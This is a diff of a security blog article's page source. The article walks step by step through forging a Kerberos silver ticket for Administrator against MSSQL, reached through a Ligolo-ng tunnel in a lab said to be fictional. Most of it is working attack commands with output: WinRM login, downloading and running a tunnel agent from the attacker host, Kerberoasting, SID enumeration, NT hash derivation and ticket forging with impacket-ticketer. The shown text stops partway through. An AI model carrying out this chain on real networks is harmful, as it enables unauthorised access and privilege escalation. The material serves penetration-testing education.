@@ -1,13 +1,12 @@
 ---
 import Layout from '../../layouts/Layout.astro';
 ---
-<Layout title="whisperx00@kali — Silver Tickets Through a Ligolo-ng Tunnel" active="articles">
+<Layout title="whisperx00@kali — Forging Silver Tickets Against MSSQL Through a Ligolo-ng Tunnel" active="articles">
 
 <div class="progress" id="progress"></div>
 
 <main class="art-main">
 
-  <!-- breadcrumb -->
   <div class="crumb">
     <a href="/">~</a>
     <span class="sep">/</span>
@@ -18,7 +17,6 @@ import Layout from '../../layouts/Layout.astro';
     <span class="here">silver-tickets-mssql-ligolo</span>
   </div>
 
-  <!-- cmd header -->
   <div class="cmd">
     <span class="u">whisperx00</span>@<span class="h">kali</span>:<span class="d">~/articles/2026</span>
     <span style="color:var(--text);">$ cat</span>
@@ -27,7 +25,6 @@ import Layout from '../../layouts/Layout.astro';
     <span style="color:var(--text);">glow</span>
   </div>
 
-  <!-- article header -->
   <header class="doc-head">
     <div class="doc-label">article · technique · active directory</div>
     <h1>Forging Silver Tickets Against MSSQL Through a Ligolo-ng Tunnel</h1>
@@ -36,7 +33,7 @@ import Layout from '../../layouts/Layout.astro';
       <span class="dot">·</span>
       <span><span class="k">published</span><span class="v">2026-05-14</span></span>
       <span class="dot">·</span>
-      <span><span class="k">read</span><span class="v">~12 min</span></span>
+      <span><span class="k">read</span><span class="v">~13 min</span></span>
       <span class="dot">·</span>
       <span><span class="k">difficulty</span><span class="v" style="color:var(--peach);">hard</span></span>
     </div>
@@ -48,6 +45,7 @@ import Layout from '../../layouts/Layout.astro';
       <span class="dtag">#ligolo-ng</span>
       <span class="dtag">#pivoting</span>
       <span class="dtag">#impacket</span>
+      <span class="dtag">#windows-privesc</span>
     </div>
   </header>
 
@@ -55,210 +53,262 @@ import Layout from '../../layouts/Layout.astro';
 
     <article>
 
-      <p>Every silver ticket tutorial assumes the target service is directly reachable from the attacker box. In real engagements, it usually isn't — the interesting services live on internal segments behind a pivot. That changes the technique in ways the standard write-ups don't explain.</p>
+      <!-- ======================================================= -->
+      <h2 id="intro"><span class="num">01.</span> Introduction</h2>
 
-      <p>This article walks through the variant: forging a silver ticket against MSSQL when the service is only reachable through a Ligolo-ng tunnel. The Kerberos forgery itself is the same. What's different — and what trips most people up — is making Kerberos cooperate with three different subsystems at once: <strong>routing, name resolution, and the local Kerberos client's realm configuration</strong>.</p>
+      <p>Silver ticket attacks allow attackers to access services as another user, even when they do not have that user's credentials, as long as they have the correct credentials for the target service. However, these services may be inaccessible to the attacker due to a firewall.</p>
 
       <blockquote>
-        <p>The walkthrough uses concrete values from a specific lab environment for clarity. Substitute your own target's domain, IPs, hostnames, and SPNs as you read. None of the techniques in this article are novel; what's underdocumented is how they compose when the service isn't directly reachable.</p>
+        <p>All hostnames, domains, usernames, credentials, hashes, SIDs, and IP addresses in this guide are fictional and used only to demonstrate the technique on a generic lab environment.</p>
       </blockquote>
 
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> diagram · attacker → ligolo tunnel → target → mssql</span></div>
-        <figcaption><span class="fig-lbl">FIG 01</span><span class="fig-alt">Network topology · attacker reaches port 1433 through a Ligolo-ng TUN interface, with the magic CIDR <code>240.0.0.1</code> mapping to the target's loopback.</span></figcaption>
-      </figure>
+      <!-- ======================================================= -->
+      <h2 id="scenario"><span class="num">02.</span> Scenario &amp; Setup</h2>
 
-      <h2 id="scenario"><span class="num">01.</span> The Scenario</h2>
+      <h3 id="current-scenario">Current Scenario</h3>
+      <p>We are working through a generic Active Directory lab machine. In order to achieve privilege escalation, we have WinRM access as a low-privileged user. This account can transfer files, execute basic commands, and run executables. In order to elevate our privileges, we must access port 1433 from the attacker machine and run commands as the Administrator user. However, we do not have credentials for the Administrator, but we do have the credentials for <code>svc_mssql</code>, which we harvested and cracked via Kerberoasting.</p>
 
-      <p>Two sets of credentials, neither sufficient alone:</p>
+      <h3 id="initial-setup">Initial Setup</h3>
+      <p>Two sets of credentials, neither of which grants admin privilege:</p>
       <ul>
-        <li><strong>A regular domain user</strong> with WinRM access on the target. Enough to land a shell, transfer files, and run commands as a low-privileged user.</li>
-        <li><strong>A service account</strong> (<code>svc_mssql</code>) previously kerberoasted and cracked offline. The account runs the MSSQL service, but it's not a logon account — it doesn't give us a shell directly.</li>
+        <li><strong>john.smith</strong> — a low-privileged user, able to execute commands via WinRM and upload files.</li>
+        <li><strong>svc_mssql</strong> — a service account that was kerberoasted and cracked offline. It issues tickets for anyone who tries to use Microsoft SQL Server.</li>
       </ul>
 
-      <p>The goal is Administrator-level access to MSSQL. Two problems stand in the way:</p>
-      <ol>
-        <li>Port 1433 isn't reachable from the attacker box — only from inside the target's network.</li>
-        <li>We don't have Administrator's credentials.</li>
-      </ol>
+      <h3 id="objective">The Objective</h3>
+      <p>Access port 1433 of the target machine from the attacker machine as the Administrator user, which allows us to execute commands on the host.</p>
 
-      <p>The plan: pivot through the WinRM session using Ligolo-ng so port 1433 becomes reachable, then forge a silver ticket for <code>Administrator</code> against the MSSQL SPN using the <code>svc_mssql</code> NT hash. The result is Administrator-level access <em>to MSSQL</em>, which we'll turn into a shell via <code>xp_cmdshell</code>.</p>
+      <h3 id="problems">The Problems</h3>
+      <ul>
+        <li>Port 1433 is only accessible locally, which means the attacker machine cannot interact with it directly.</li>
+        <li>We do not have Administrator's credentials.</li>
+      </ul>
 
-      <h2 id="why"><span class="num">02.</span> Why Silver Tickets Work</h2>
+      <h3 id="workaround">The Workaround</h3>
+      <ul>
+        <li>By using Ligolo, we are able to interact with ports that are only accessible via localhost.</li>
+        <li>We can perform a silver ticket attack in order to forge tickets as Administrator and use them.</li>
+      </ul>
 
-      <p>A silver ticket is a forged TGS — a service ticket that Kerberos would normally hand out only after a client successfully authenticated to the KDC and requested access to a specific service.</p>
+      <!-- ======================================================= -->
+      <h2 id="tunnel"><span class="num">03.</span> Step 1: Communicate with Port 1433 via Tunneling</h2>
 
-      <p>The reason forgery is possible is structural. When a service receives a TGS, it does <strong>not</strong> call back to the KDC to verify the ticket. Instead, it validates the ticket's signature and decrypts its contents using its own NT hash — the same hash used by the account the service runs under. The KDC isn't in the loop at validation time at all.</p>
+      <h3 id="winrm">1.1 Access via WinRM</h3>
 
-      <p>The PAC (Privilege Attribute Certificate) embedded in the ticket contains the user's identity and group memberships. It's signed twice: once with the service account's hash (the server signature), and once with the KDC's hash (the KDC signature). <strong>Most service implementations only validate the server signature.</strong></p>
-
-      <p>This means: if you have the service account's NT hash, you can forge a TGS for any username, stuff the PAC with any group memberships, and the service will accept it as valid.</p>
-
-      <p>The forged identity is only good against that one service, plus any other service running under the same account. That's the difference from a golden ticket: a golden ticket is forged with the <code>krbtgt</code> hash and works domain-wide. A silver ticket is narrower in scope but easier to obtain — you just need to compromise a service account, not domain replication.</p>
-
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> diagram · silver vs golden ticket trust scope</span></div>
-        <figcaption><span class="fig-lbl">FIG 02</span><span class="fig-alt">Silver vs golden ticket scope — silver is scoped to one service/account, golden works domain-wide because every service trusts <code>krbtgt</code>.</span></figcaption>
-      </figure>
-
-      <h2 id="subsystems"><span class="num">03.</span> The Three Subsystems You Have to Align</h2>
-
-      <p>When the target service is behind a tunnel, the silver ticket itself doesn't change. What changes is the operator's environment. Three subsystems need to be aligned before a forged ticket will be accepted:</p>
-
-      <div class="triad">
-        <div class="triad-card" style="--col:var(--green);">
-          <div class="tn">▸ subsystem 01</div>
-          <div class="tt">Routing</div>
-          <div class="td">The attacker box needs an IP path to the target service. Ligolo-ng solves this with a TUN interface plus an agent on the pivot host. The convention is to route a reserved CIDR like <code>240.0.0.1/32</code> over the tunnel — unallocated, so it won't conflict with real networks.</div>
+      <div class="cb" data-host="attacker">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">@kali</span></span>
+          <span class="cb-lang">bash · evil-winrm</span>
+          <button class="copy" data-idx="0">cp</button>
         </div>
-        <div class="triad-card" style="--col:var(--peach);">
-          <div class="tn">▸ subsystem 02</div>
-          <div class="tt">Name resolution</div>
-          <div class="td">Kerberos authenticates to <strong>SPNs</strong>, not IPs. A typical MSSQL SPN looks like <code>MSSQLSvc/dc01.corp.local:1433</code>. Point at <code>240.0.0.1</code> and the client builds the wrong SPN. Map the real hostname to the tunneled IP in <code>/etc/hosts</code>.</div>
-        </div>
-        <div class="triad-card" style="--col:var(--mauve);">
-          <div class="tn">▸ subsystem 03</div>
-          <div class="tt">Kerberos realm config</div>
-          <div class="td">The Kerberos client needs to know which KDC to talk to for the target realm. That lives in <code>/etc/krb5.conf</code>. Without it, AS-REQs and TGS-REQs go to the wrong place or fail outright.</div>
-        </div>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">evil-winrm</span> <span class="flag">-i</span> <span class="arg">10.10.10.20</span> <span class="flag">-u</span> <span class="str">'JOHN.SMITH'</span> <span class="flag">-p</span> <span class="str">'Winter2024!'</span>
+
+<span class="out">Evil-WinRM shell v3.9
+Info: Establishing connection to remote endpoint</span></pre>
       </div>
 
-      <h2 id="walkthrough"><span class="num">04.</span> Walkthrough</h2>
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · evil-winrm session established</span></div>
+        <figcaption><span class="fig-lbl">FIG 01</span><span class="fig-alt">WinRM session as john.smith on 10.10.10.20 — low-privileged foothold.</span></figcaption>
+      </figure>
 
-      <div class="step"><span class="step-n">Step 1</span><span>Establish the tunnel</span></div>
+      <h3 id="reaching-1433">Reaching Port 1433</h3>
+      <p>Confirm port 1433 is listening locally on the target:</p>
 
-      <p>On the attacker box, create the TUN interface that Ligolo-ng will use:</p>
+      <div class="cb" data-host="target-win">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⊟</span><span class="hw">target</span><span class="hwo">win · winrm</span></span>
+          <span class="cb-lang">powershell · netstat</span>
+          <button class="copy" data-idx="1">cp</button>
+        </div>
+        <pre><span class="prm">*Evil-WinRM* PS C:\Users\john.smith\Documents&gt;</span> <span class="cmd">netstat -ano</span>
+
+<span class="out">Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       644
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       644
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2200</span></pre>
+      </div>
+
+      <blockquote>
+        <p>Despite being bound to 0.0.0.0, the computer's firewall actively blocks the port from external connections.</p>
+      </blockquote>
+
+      <h3 id="ligolo-setup">1.2 Setting Up the Ligolo Network Interface</h3>
+      <p>Create the TUN interface for Ligolo on the attacker machine:</p>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">@kali</span></span>
           <span class="cb-lang">bash · tun setup</span>
-          <button class="copy" data-idx="0">cp</button>
+          <button class="copy" data-idx="2">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">sudo ip tuntap add user</span> <span class="var">$(whoami)</span> <span class="cmd">mode tun ligolo</span>
-<span class="prm">$</span> <span class="cmd">sudo ip link set ligolo up</span>
-<span class="prm">$</span> <span class="cmd">sudo ligolo-proxy -selfcert</span></pre>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">sudo ip tuntap add user</span> <span class="var">$(whoami)</span> <span class="cmd">mode tun ligolo</span>
+<span class="prm">└─$</span> <span class="cmd">sudo ip link set ligolo up</span>
+<span class="prm">└─$</span> <span class="cmd">sudo ligolo-proxy -selfcert</span></pre>
       </div>
 
-      <p>Serve the agent binary so the target can fetch it:</p>
+      <p>These commands create the network interface and start the Ligolo proxy, which will listen for the agent connection.</p>
+
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ligolo-proxy listening, waiting for agent</span></div>
+        <figcaption><span class="fig-lbl">FIG 02</span><span class="fig-alt">ligolo-proxy started with self-signed cert, listening on :11601.</span></figcaption>
+      </figure>
+
+      <p>Host the agent binary with a Python HTTP server, then download and execute it from the WinRM session:</p>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">@kali</span></span>
           <span class="cb-lang">bash · serve agent</span>
-          <button class="copy" data-idx="1">cp</button>
+          <button class="copy" data-idx="3">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">python3</span> <span class="flag">-m</span> <span class="arg">http.server</span> <span class="num">8000</span></pre>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">python3 -m http.server</span>
+<span class="out">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></pre>
       </div>
-
-      <p>In the WinRM session, pull and run the agent pointed at the Ligolo proxy:</p>
 
       <div class="cb" data-host="target-win">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⊟</span><span class="hw">target</span><span class="hwo">win · winrm</span></span>
-          <span class="cb-lang">powershell · agent dial-back</span>
-          <button class="copy" data-idx="2">cp</button>
+          <span class="cb-lang">powershell · download agent</span>
+          <button class="copy" data-idx="4">cp</button>
         </div>
-        <pre><span class="prm">PS&gt;</span> <span class="cmd">cmd /c curl</span> <span class="flag">-O</span> <span class="arg">http://10.10.14.5:8000/agent.exe</span>
-<span class="prm">PS&gt;</span> <span class="cmd">cmd /c agent.exe</span> <span class="flag">-connect</span> <span class="arg">10.10.14.5:11601</span> <span class="flag">-ignore-cert</span>
-<span class="out">time=... level=info msg="Connection established" addr="10.10.14.5:11601"</span></pre>
+        <pre><span class="prm">*Evil-WinRM* PS C:\temp&gt;</span> <span class="cmd">cmd /c curl</span> <span class="flag">-O</span> <span class="arg">http://10.10.14.5:8000/agent.exe</span></pre>
       </div>
 
-      <p>On the operator side, attach to the session in the Ligolo console, then add the route and start the relay:</p>
+      <div class="cb" data-host="target-win">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⊟</span><span class="hw">target</span><span class="hwo">win · winrm</span></span>
+          <span class="cb-lang">powershell · run agent</span>
+          <button class="copy" data-idx="5">cp</button>
+        </div>
+        <pre><span class="prm">*Evil-WinRM* PS C:\temp&gt;</span> <span class="cmd">cmd /c agent.exe</span> <span class="flag">-connect</span> <span class="arg">10.10.14.5:11601</span> <span class="flag">-ignore-cert</span>
+<span class="out">time="2026-05-14T06:32:30-07:00" level=warning msg="warning, certificate validation disabled"
+time="2026-05-14T06:32:30-07:00" level=info msg="Connection established" addr="10.10.14.5:11601"</span></pre>
+      </div>
+
+      <p>On the Ligolo console, attach to the session and start the relay:</p>
 
       <div class="cb" data-host="ligolo">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⇋</span><span class="hw">ligolo-ng</span><span class="hwo">proxy console</span></span>
           <span class="cb-lang">tunnel control</span>
-          <button class="copy" data-idx="3">cp</button>
+          <button class="copy" data-idx="6">cp</button>
         </div>
-        <pre><span class="out">ligolo-ng »</span> <span class="cmd">session</span>
-<span class="out">? Specify a session : 1 - CORP\john.smith@srv01 - 10.10.10.20:49952</span>
-<span class="out">ligolo-ng »</span> <span class="cmd">start</span></pre>
+        <pre><span class="out">ligolo-ng » INFO[0330] Agent joined. name="CORP\john.smith@srv01" remote="10.10.10.20:50118"
+ligolo-ng »</span> <span class="cmd">session</span>
+<span class="out">? Specify a session : 1 - CORP\john.smith@srv01 - 10.10.10.20:49952 - 00505686048f
+ligolo-ng »</span> <span class="cmd">start</span></pre>
       </div>
+
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · agent connection received in ligolo console</span></div>
+        <figcaption><span class="fig-lbl">FIG 03</span><span class="fig-alt">Agent joined confirmation and session started in the Ligolo-ng proxy console.</span></figcaption>
+      </figure>
+
+      <p>Add a route for the magic CIDR — <code>240.0.0.1</code> maps to the loopback of the target machine:</p>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
-          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">@kali</span></span>
+          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">linux terminal</span></span>
           <span class="cb-lang">bash · route via tunnel</span>
-          <button class="copy" data-idx="4">cp</button>
+          <button class="copy" data-idx="7">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">sudo ip route add</span> <span class="num">240.0.0.1/32</span> <span class="flag">dev</span> <span class="arg">ligolo</span></pre>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">sudo ip route add</span> <span class="num">240.0.0.1/32</span> <span class="flag">dev</span> <span class="arg">ligolo</span></pre>
       </div>
 
-      <p><code>240.0.0.1</code> now reaches into the target network through the pivot. This address maps to the target's loopback — so localhost-only services on the target become reachable from the attacker.</p>
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ping 240.0.0.1 showing loopback is reachable</span></div>
+        <figcaption><span class="fig-lbl">FIG 04</span><span class="fig-alt">Pinging 240.0.0.1 succeeds — loopback services on the target are now reachable from the attacker machine.</span></figcaption>
+      </figure>
 
-      <div class="step"><span class="step-n">Step 2</span><span>Confirm MSSQL reachability</span></div>
-
-      <p>Test using the <code>svc_mssql</code> credentials — this proves the tunnel works and the service is up:</p>
+      <h3 id="access-1433">Access Port 1433 (MSSQL)</h3>
+      <p>With the tunnel active, connect to MSSQL through the magic CIDR using the <code>svc_mssql</code> credentials:</p>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ 240.0.0.1:1433</span></span>
-          <span class="cb-lang">bash · reachability probe</span>
-          <button class="copy" data-idx="5">cp</button>
+          <span class="cb-lang">bash · mssql via tunnel</span>
+          <button class="copy" data-idx="8">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">impacket-mssqlclient</span> <span class="arg">svc_mssql:Passw0rd123!@240.0.0.1</span> <span class="flag">-windows-auth</span>
-<span class="out">[*] Encryption required, switching to TLS
-[*] INFO(srv01\SQLEXPRESS): Line 1: Changed database context to 'master'.
-SQL (CORP\svc_mssql  guest@master)&gt;</span></pre>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">impacket-mssqlclient</span> <span class="arg">svc_mssql:Passw0rd123!@240.0.0.1</span> <span class="flag">-windows-auth</span>
+<span class="out">Impacket v0.14.0.dev0 - Copyright Fortra, LLC
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] INFO(srv01\SQLEXPRESS): Line 1: Changed database context to 'master'.</span></pre>
       </div>
 
-      <p>The session opens as <code>svc_mssql</code> with <code>guest</code>-level database access — not enough to run <code>xp_cmdshell</code>. We need to impersonate Administrator. That's where the silver ticket comes in.</p>
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · mssqlclient connected as svc_mssql</span></div>
+        <figcaption><span class="fig-lbl">FIG 05</span><span class="fig-alt">First problem solved: port 1433 is reachable through the tunnel. We can authenticate as svc_mssql — but not yet as Administrator.</span></figcaption>
+      </figure>
 
-      <div class="step"><span class="step-n">Step 3</span><span>Collect the four ingredients</span></div>
+      <p>The first problem is solved: we can interact with port 1433 as <code>svc_mssql</code>. However, we still need to access it as the Administrator user in order to run commands such as <code>xp_cmdshell</code>.</p>
 
-      <p>A silver ticket requires: the target username (<code>Administrator</code>), the SPN, the domain SID, and the NT hash of the service account.</p>
+      <blockquote>
+        <p>Note: this lab uses the SPN format <code>MSSQL/...</code> rather than the usual <code>MSSQLSvc/host:port</code> convention.</p>
+      </blockquote>
 
-      <p>Get the SPN from <code>GetUserSPNs</code> — same command used to kerberoast, it also prints the SPN:</p>
+      <!-- ======================================================= -->
+      <h2 id="silver"><span class="num">04.</span> Silver Ticket Attack</h2>
+
+      <h3 id="get-spn">Get the SPN</h3>
+      <p>This is the same command used to obtain the <code>svc_mssql</code> hash earlier. It also shows the SPN (Service Principal Name), which is required to forge the ticket. The SPN can also be seen in BloodHound.</p>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ dc01</span></span>
-          <span class="cb-lang">bash · get spn</span>
-          <button class="copy" data-idx="6">cp</button>
+          <span class="cb-lang">bash · GetUserSPNs</span>
+          <button class="copy" data-idx="9">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">impacket-GetUserSPNs</span> <span class="str">'corp.local/john.smith:Winter2024!'</span> <span class="flag">-dc-ip</span> <span class="arg">10.10.10.10</span> <span class="flag">-request</span>
-
-<span class="out">ServicePrincipalName    Name       PasswordLastSet
-----------------------  ---------  ----------------------------
-MSSQL/srv01.corp.local  svc_mssql  2023-04-30 03:45:33.288595</span></pre>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">impacket-GetUserSPNs</span> <span class="str">"corp.local"/"john.smith":"Winter2024!"</span> <span class="flag">-dc-ip</span> <span class="arg">10.10.10.10</span> <span class="flag">-request -outputfile</span> <span class="arg">hashes.kerberoasting</span>
+<span class="out">
+ServicePrincipalName    Name       MemberOf  PasswordLastSet              LastLogon
+----------------------  ---------  --------  ---------------------------  ---------------------------
+MSSQL/srv01.corp.local  svc_mssql            2023-04-30 03:45:33.288595   2024-08-03 13:48:01.815298</span></pre>
       </div>
 
-      <p>Get the domain SID using <code>lookupsid</code> through the tunnel:</p>
+      <h3 id="get-sid">Get the Domain SID</h3>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ 240.0.0.1</span></span>
-          <span class="cb-lang">bash · grab domain sid</span>
-          <button class="copy" data-idx="7">cp</button>
+          <span class="cb-lang">bash · lookupsid</span>
+          <button class="copy" data-idx="10">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">impacket-lookupsid</span> <span class="str">'corp.local/svc_mssql:Passw0rd123!'</span><span class="arg">@240.0.0.1</span>
-<span class="out">[*] Domain SID is: S-1-5-21-1111111111-2222222222-3333333333</span></pre>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">impacket-lookupsid</span> <span class="str">'corp.local'/'svc_mssql':'Passw0rd123!'</span><span class="arg">@240.0.0.1</span>
+<span class="out">Impacket v0.14.0.dev0 - Copyright Fortra, LLC
+
+[*] Brute forcing SIDs at 240.0.0.1
+[*] StringBinding ncacn_np:240.0.0.1[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-1111111111-2222222222-3333333333</span></pre>
       </div>
 
-      <p>Derive the NT hash from the cracked plaintext password:</p>
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · lookupsid output showing domain SID</span></div>
+        <figcaption><span class="fig-lbl">FIG 06</span><span class="fig-alt">Domain SID retrieved via the Ligolo tunnel using svc_mssql credentials.</span></figcaption>
+      </figure>
+
+      <h3 id="hosts">Edit <code>/etc/hosts</code></h3>
+      <p>Replace the current IP with <code>240.0.0.1</code> and add the KDC hostname (<code>srv01.corp.local</code>) obtained from <code>GetUserSPNs</code>.</p>
 
       <div class="cb" data-host="local">
         <div class="cb-head">
-          <span class="cb-host"><span class="ico">▢</span><span class="hw">local</span><span class="hwo">offline · no network</span></span>
-          <span class="cb-lang">bash · compute nt hash</span>
-          <button class="copy" data-idx="8">cp</button>
-        </div>
-        <pre><span class="var">NT</span>=<span class="var">$(</span><span class="cmd">echo</span> <span class="flag">-n</span> <span class="str">'Passw0rd123!'</span> | <span class="cmd">iconv</span> <span class="flag">-t</span> <span class="arg">utf-16le</span> | <span class="cmd">openssl dgst</span> <span class="flag">-md4 -r</span> | <span class="cmd">awk</span> <span class="str">'&#123;print $1&#125;'</span><span class="var">)</span>
-<span class="prm">$</span> <span class="cmd">echo</span> <span class="var">$NT</span>
-<span class="out">ab4f5a5c42df5a0ee337d12ce77332f5</span></pre>
-      </div>
-
-      <div class="step"><span class="step-n">Step 4</span><span>Configure name resolution and Kerberos</span></div>
-
-      <p>Edit <code>/etc/hosts</code> so the target hostname resolves to the tunneled IP. Replace the old entry:</p>
-
-      <div class="cb" data-host="attacker">
-        <div class="cb-head">
-          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">/etc/hosts</span></span>
+          <span class="cb-host"><span class="ico">▢</span><span class="hw">attacker</span><span class="hwo">/etc/hosts</span></span>
           <span class="cb-lang">hosts · before → after</span>
-          <button class="copy" data-idx="9">cp</button>
+          <button class="copy" data-idx="11">cp</button>
         </div>
         <pre><span class="out cmt"># before</span>
 <span class="num">10.10.10.20</span>  <span class="arg">corp.local</span>
@@ -267,173 +317,340 @@ MSSQL/srv01.corp.local  svc_mssql  2023-04-30 03:45:33.288595</span></pre>
 <span class="num">240.0.0.1</span>    <span class="arg">srv01.corp.local</span> <span class="arg">corp.local</span></pre>
       </div>
 
-      <p>Generate a <code>krb5.conf</code> with <code>nxc</code>:</p>
+      <h3 id="ntlm-hash">Getting the NTLM Hash from svc_mssql</h3>
+      <p>Since we have the <code>svc_mssql</code> credential, we can turn it into an NTLM hash, which is required to generate the silver ticket:</p>
 
-      <div class="cb" data-host="attacker">
+      <div class="cb" data-host="local">
         <div class="cb-head">
-          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ dc01</span></span>
-          <span class="cb-lang">bash · realm config</span>
-          <button class="copy" data-idx="10">cp</button>
+          <span class="cb-host"><span class="ico">▢</span><span class="hw">local</span><span class="hwo">offline · no network</span></span>
+          <span class="cb-lang">bash · compute nt hash</span>
+          <button class="copy" data-idx="12">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">nxc smb</span> <span class="arg">240.0.0.1</span> <span class="flag">-u</span> <span class="str">'svc_mssql'</span> <span class="flag">-p</span> <span class="str">'Passw0rd123!'</span> <span class="flag">--generate-krb5-file</span> <span class="arg">krb5.conf</span>
-<span class="out">SMB  240.0.0.1  445  SRV01  [+] krb5 conf saved to: krb5.conf</span>
-<span class="prm">$</span> <span class="cmd">sudo cp</span> <span class="arg">krb5.conf</span> <span class="arg">/etc/krb5.conf</span></pre>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="var">NT</span>=<span class="var">$(</span><span class="cmd">echo</span> <span class="flag">-n</span> <span class="str">'Passw0rd123!'</span> | <span class="cmd">iconv</span> <span class="flag">-t</span> <span class="arg">utf-16le</span> | <span class="cmd">openssl dgst</span> <span class="flag">-md4 -r</span> | <span class="cmd">awk</span> <span class="str">'&#123;print $1&#125;'</span><span class="var">)</span>
+
+<span class="prm">└─$</span> <span class="cmd">echo</span> <span class="var">$NT</span>
+<span class="out">ab4f5a5c42df5a0ee337d12ce77332f5</span></pre>
       </div>
 
-      <p>The result maps <code>CORP.LOCAL</code> realm → KDC at <code>srv01.corp.local</code>, which via <code>/etc/hosts</code> resolves to <code>240.0.0.1</code>. All three subsystems are now aligned.</p>
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · NT hash derivation from plaintext password</span></div>
+        <figcaption><span class="fig-lbl">FIG 07</span><span class="fig-alt">NTLM hash computed offline from the cracked svc_mssql password using openssl MD4.</span></figcaption>
+      </figure>
 
-      <div class="step"><span class="step-n">Step 5</span><span>Forge the silver ticket</span></div>
+      <h3 id="ticketer">Acquiring the Ticket for the Administrator User</h3>
 
       <div class="cb" data-host="local">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">▢</span><span class="hw">local</span><span class="hwo">offline · forge</span></span>
           <span class="cb-lang">bash · impacket-ticketer</span>
-          <button class="copy" data-idx="11">cp</button>
+          <button class="copy" data-idx="13">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">impacket-ticketer</span> <span class="arg">Administrator</span> \
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">impacket-ticketer</span> <span class="arg">Administrator</span> \
     <span class="flag">-spn</span> <span class="str">"MSSQL/srv01.corp.local"</span> \
     <span class="flag">-domain</span> <span class="str">'corp.local'</span> \
     <span class="flag">-domain-sid</span> <span class="str">'S-1-5-21-1111111111-2222222222-3333333333'</span> \
     <span class="flag">-nthash</span> <span class="str">"ab4f5a5c42df5a0ee337d12ce77332f5"</span>
-<span class="out">[*] Creating basic skeleton ticket and PAC Infos
+<span class="out">Impacket v0.14.0.dev0 - Copyright Fortra, LLC
+
+[*] Creating basic skeleton ticket and PAC Infos
 [*] Customizing ticket for corp.local/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
 [*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
 [*] Saving ticket in Administrator.ccache</span></pre>
       </div>
 
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · impacket-ticketer output</span></div>
